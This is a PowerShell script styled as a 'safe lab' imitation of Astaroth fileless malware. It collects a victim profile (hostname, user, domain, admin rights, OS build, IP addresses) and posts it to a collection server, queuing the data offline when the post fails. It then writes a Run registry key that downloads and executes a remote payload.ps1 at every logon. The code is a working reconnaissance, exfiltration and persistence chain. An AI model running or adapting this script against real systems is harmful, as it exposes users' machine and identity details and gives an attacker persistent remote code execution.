$payloadServer = "http://192.168.141.1:8000"
$collectServer = "http://192.168.141.1:8001"
$collectUrl = "$collectServer/collect"
$payloadUrl = "$payloadServer/payload.ps1"
$runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$runKeyName = "FilelessLabDemo"
$queueDir = Join-Path $env:TEMP "FilelessLab\queue"

function Send-LabProfile {
    param(
        [Parameter(Mandatory = $true)]
        [string] $Json
    )

    try {
        Invoke-RestMethod -Uri $collectUrl -Method Post -ContentType "application/json; charset=utf-8" -Body $Json | Out-Null
        return $true
    } catch {
        return $false
    }
}

function Save-OfflineProfile {
    param(
        [Parameter(Mandatory = $true)]
        [string] $Json
    )

    New-Item -ItemType Directory -Force -Path $queueDir | Out-Null
    $name = "victim-profile-{0}.json" -f (Get-Date -Format "yyyyMMdd-HHmmss-fff")
    $path = Join-Path $queueDir $name
    Set-Content -Path $path -Value $Json -Encoding UTF8
}

function Flush-OfflineQueue {
    if (-not (Test-Path -LiteralPath $queueDir)) {
        return
    }

    Get-ChildItem -LiteralPath $queueDir -Filter "victim-profile-*.json" -File -ErrorAction SilentlyContinue | ForEach-Object {
        $queuedJson = Get-Content -LiteralPath $_.FullName -Raw
        if (Send-LabProfile -Json $queuedJson) {
            Remove-Item -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue
        }
    }
}

$os = Get-CimInstance Win32_OperatingSystem
$net = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled }
$ipAddresses = @($net | ForEach-Object { $_.IPAddress } | Where-Object { $_ -match '^\d+\.' })
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

$profile = [ordered]@{
    lab_id = "Astaroth-inspired-safe-lab"
    execution_mode = "silent-victim-view"
    staging_mode = "offline-cache-enabled"
    timestamp = (Get-Date).ToString("o")
    computer_name = $env:COMPUTERNAME
    user_name = $env:USERNAME
    user_domain = $env:USERDOMAIN
    is_admin = $isAdmin
    os_caption = $os.Caption
    os_version = $os.Version
    os_build = $os.BuildNumber
    powershell_version = $PSVersionTable.PSVersion.ToString()
    process_id = $PID
    current_directory = (Get-Location).Path
    offline_queue = $queueDir
    ip_addresses = $ipAddresses
}

$json = $profile | ConvertTo-Json -Depth 4

Flush-OfflineQueue
if (-not (Send-LabProfile -Json $json)) {
    Save-OfflineProfile -Json $json
}

$persistenceCommand = "powershell.exe -NoProfile -Command `"try { `$x = Invoke-RestMethod '$payloadUrl'; `$sb = [ScriptBlock]::Create([string]`$x); & `$sb } catch { }`""
New-ItemProperty -Path $runKeyPath -Name $runKeyName -Value $persistenceCommand -PropertyType String -Force | Out-Null
